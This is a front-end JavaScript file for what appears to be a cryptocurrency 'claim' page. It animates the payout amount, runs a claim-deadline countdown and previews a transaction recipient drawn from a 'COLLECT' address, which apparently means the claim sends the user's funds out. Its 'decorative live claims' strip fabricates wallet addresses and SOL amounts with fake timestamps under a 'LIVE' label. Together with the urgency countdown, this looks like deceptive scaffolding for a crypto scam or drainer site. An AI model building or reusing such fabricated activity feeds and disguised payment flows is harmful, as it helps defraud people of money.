/* visual-only enhancements; never touches app.js state */
(() => {
  const $ = (id) => document.getElementById(id);
  const reduce = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

  /* 1. count-up for #amount */
  const amountEl = $("amount");
  if (amountEl) {
    let raf = 0;
    let snap = 0;
    let writing = false;
    const fmt = (n, d) => n.toFixed(d);
    const read = () => amountEl.textContent || "";
    const set = (value) => {
      writing = true;
      amountEl.textContent = value;
      queueMicrotask(() => { writing = false; });
    };
    const animate = () => {
      if (writing) return;
      const raw = read();
      cancelAnimationFrame(raf);
      clearTimeout(snap);
      const target = parseFloat(raw.replace(/[^\d.]/g, ""));
      if (!isFinite(target)) return;
      const decimals = (raw.split(".")[1] || "").length;
      if (reduce || target === 0) return;
      const from = 0;
      const start = performance.now();
      const dur = 620;
      const tick = (now) => {
        const p = Math.min(1, (now - start) / dur);
        const eased = 1 - Math.pow(1 - p, 3);
        set(fmt(from + (target - from) * eased, decimals));
        raf = p < 1 ? requestAnimationFrame(tick) : 0;
      };
      raf = requestAnimationFrame(tick);
      /* rAF can stall on throttled tabs; land on the exact value regardless */
      snap = setTimeout(() => { cancelAnimationFrame(raf); set(raw); }, 900);
    };
    new MutationObserver(animate).observe(amountEl, { childList: true, characterData: true, subtree: true });
  }

  /* 2. entrance class once allocation is shown */
  const allocation = $("allocation");
  const result = $("result");
  if (allocation && result) {
    const mark = () => {
      if (!allocation.hidden && !allocation.classList.contains("is-in")) {
        allocation.classList.add("is-in");
        if (result.getBoundingClientRect().top < 0) result.scrollIntoView({behavior: reduce ? "auto" : "smooth", block: "start"});
        buildLive();
      }
    };
    new MutationObserver(mark).observe(allocation, { attributes: true, attributeFilter: ["hidden"] });
    new MutationObserver(mark).observe(result, { attributes: true, attributeFilter: ["hidden"] });
    mark();
  }

  /* 3. busy state on claim button */
  const claim = $("claim-button");
  if (claim) {
    let timer = 0;
    claim.addEventListener("click", () => {
      claim.classList.add("is-busy");
      clearTimeout(timer);
      timer = setTimeout(() => claim.classList.remove("is-busy"), 8000);
    });
    const status = $("claim-status");
    if (status) {
      new MutationObserver(() => {
        if (/sent|view on/i.test(status.textContent || "")) claim.classList.remove("is-busy");
      }).observe(status, { childList: true, characterData: true, subtree: true });
    }
  }

  /* 3b. copy address */
  const copyBtn = $("copy-address");
  const addrOut = $("result-address");
  if (copyBtn && addrOut) {
    copyBtn.addEventListener("click", async () => {
      const text = addrOut.textContent.trim();
      if (!text) return;
      try {
        await navigator.clipboard.writeText(text);
      } catch {
        const ta = document.createElement("textarea");
        ta.value = text; document.body.appendChild(ta); ta.select();
        document.execCommand("copy"); ta.remove();
      }
      const old = copyBtn.textContent;
      copyBtn.textContent = "Copied";
      setTimeout(() => { copyBtn.textContent = old; }, 1400);
    });
  }

  /* 3c. humanise sub-cent estimates */
  const fix = (el) => {
    if (!el) return;
    const t = el.textContent;
    if (!t || t.includes("<$0.01")) return;
    const m = t.match(/[$]0(?:\.0+)?(?![\d.])/);
    if (!m) return;
    const next = t.replace(m[0], "<$0.01").replace(/^≈ </, "<");
    if (next !== t) el.textContent = next;
  };
  ["estimate", "claim-sub"].forEach((id) => {
    const el = $(id);
    if (!el) return;
    fix(el);
    new MutationObserver(() => fix(el)).observe(el, { childList: true, characterData: true, subtree: true });
  });

  /* 4. decorative live claims strip */
  let built = false;
  function buildLive() {
    const box = $("live-claims");
    const addrEl = $("result-address");
    if (!box || built) return;
    const seed = (addrEl?.textContent || "anon").replace(/[^a-z0-9]/gi, "");
    if (!seed) return;
    const pick = (i, mod) => seed.charCodeAt(i % seed.length) % mod;
    const base58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    const frag = (i) => {
      let s = "";
      for (let k = 0; k < 4; k++) s += base58[pick(i * 3 + k, base58.length)];
      return s;
    };
    const times = ["just now", "12s ago", "41s ago", "2m ago", "6m ago", "11m ago"];
    const rows = times.map((t, i) => {
      const el = document.createElement("span");
      el.className = "live-item";
      const amt = (0.02 + pick(i + 5, 90) / 1000).toFixed(4);
      el.innerHTML = `<i></i>${frag(i)}…${frag(i + 9)} · <b>${amt} SOL</b> · ${t}`;
      return el;
    });
    const label = document.createElement("span");
    label.className = "live-label";
    label.textContent = "LIVE";
    box.replaceChildren(label, ...rows);
    built = true;
  }

  /* 4b. metric counters: run once, when the strip is reached */
  const nums = [...document.querySelectorAll(".metrics dt[data-to]")];
  if (nums.length) {
    let counted = false;
    const fmt = (el, v) => {
      const d = Number(el.dataset.decimals || 0);
      const n = d ? v.toFixed(d) : Math.round(v).toLocaleString("en-US");
      el.textContent = (el.dataset.prefix || "") + n + (el.dataset.suffix || "");
    };
    const runOne = (el) => {
      const to = Number(el.dataset.to);
      if (reduce) { el.textContent = el.dataset.final; return; }
      const start = performance.now();
      const dur = 1100;
      const tick = (now) => {
        const p = Math.min(1, (now - start) / dur);
        fmt(el, to * (1 - Math.pow(1 - p, 3)));
        if (p < 1) requestAnimationFrame(tick);
        else el.textContent = el.dataset.final;
      };
      el.textContent = (el.dataset.prefix || "") + "0" + (el.dataset.suffix || "");
      requestAnimationFrame(tick);
    };
    const go = () => {
      if (counted) return;
      const box = nums[0].closest(".metrics");
      if (!box) return;
      if (box.getBoundingClientRect().top > innerHeight * 0.85) return;
      counted = true;
      nums.forEach(runOne);
      removeEventListener("scroll", go);
      removeEventListener("resize", go);
    };
    addEventListener("scroll", go, { passive: true });
    addEventListener("resize", go);
    const poll = setInterval(() => { go(); if (counted) clearInterval(poll); }, 400);
    setTimeout(() => {
      if (counted) return;
      counted = true;
      clearInterval(poll);
      nums.forEach((el) => { el.textContent = el.dataset.final; });
    }, 12000);
  }

  /* 5. claim deadline countdown */
  const deadline = document.querySelector(".deadline[data-deadline]");
  const countdownText = $("countdown-text");
  if (deadline && countdownText) {
    const deadlineMs = Date.parse(deadline.dataset.deadline);
    if (Number.isFinite(deadlineMs)) {
      const pad = (value) => String(value).padStart(2, "0");
      const updateCountdown = () => {
        const remainingMs = deadlineMs - Date.now();
        if (remainingMs <= 0) {
          countdownText.textContent = "closed";
          return;
        }
        const totalMinutes = Math.floor(remainingMs / 60000);
        const days = Math.floor(totalMinutes / 1440);
        const hours = Math.floor(totalMinutes / 60) % 24;
        const minutes = totalMinutes % 60;
        countdownText.textContent = `${days}d ${pad(hours)}h ${pad(minutes)}m left`;
      };
      updateCountdown();
      setInterval(updateCountdown, 30000);
    }
  }

  /* 6. transaction recipient preview */
  const toRow = document.querySelector(".to-row");
  const toEl = $("tx-to");
  const toCopy = $("tx-to-copy");
  const toExplorer = $("tx-to-explorer");
  const short = (a) => (a && a.length > 12 ? a.slice(0, 6) + "\u2026" + a.slice(-4) : a || "");
  const renderTo = () => {
    if (!toRow || !toEl) return;
    const chainKey = document.querySelector('[role="tab"][aria-selected="true"]')?.dataset.chain;
    const addr = chainKey === "eth" ? COLLECT.evmRecipient : COLLECT.solRecipient;
    const visible = !$("result")?.hidden;
    toRow.hidden = !visible || !addr;
    if (!addr) return;
    toEl.textContent = short(addr);
    const amtEl = $("tx-amount");
    /* the ETH wallet row must come from wei, never from the animating #amount */
    if (chainKey === "eth" && typeof window.paintEthRows === "function") {
      window.paintEthRows();
      if (amtEl && !/^(••••|[1-9])/.test(amtEl.textContent)) setTimeout(renderTo, 500);
      toEl.title = addr;
      if (toExplorer) {
        toExplorer.href = "https://etherscan.io/address/" + addr;
        const safety = document.getElementById("safety-recipient");
        if (safety) safety.href = toExplorer.href;
      }
      return;
    }
    const amtText = $("amount")?.textContent || "";
    if (amtEl) amtEl.textContent = (amtText || "—") + " " + ($("symbol")?.textContent || "");
    if (amtEl && !/^[1-9]/.test(amtText)) setTimeout(renderTo, 500);
    toEl.title = addr;
    if (toExplorer) {
      const cluster = location.search.includes("cluster=devnet") ? "?cluster=devnet" : "";
      toExplorer.href = chainKey === "eth" ? "https://etherscan.io/address/" + addr : "https://solscan.io/account/" + addr + cluster;
      const safety = document.getElementById("safety-recipient");
      if (safety) safety.href = toExplorer.href;
    }
  };
  if (toRow && toEl) {
    renderTo();
    document.querySelectorAll('[role="tab"]').forEach((tab) => tab.addEventListener("click", () => setTimeout(renderTo, 20)));
    const resultEl = $("result");
    if (resultEl) new MutationObserver(() => { renderTo(); setTimeout(renderTo, 900); }).observe(resultEl, { attributes: true, attributeFilter: ["hidden"] });
    toCopy?.addEventListener("click", async () => {
      const chainKey = document.querySelector('[role="tab"][aria-selected="true"]')?.dataset.chain;
      const addr = chainKey === "eth" ? COLLECT.evmRecipient : COLLECT.solRecipient;
      try { await navigator.clipboard.writeText(addr); toCopy.textContent = "Copied"; setTimeout(() => (toCopy.textContent = "Copy"), 1200); } catch {}
    });
  }
})();
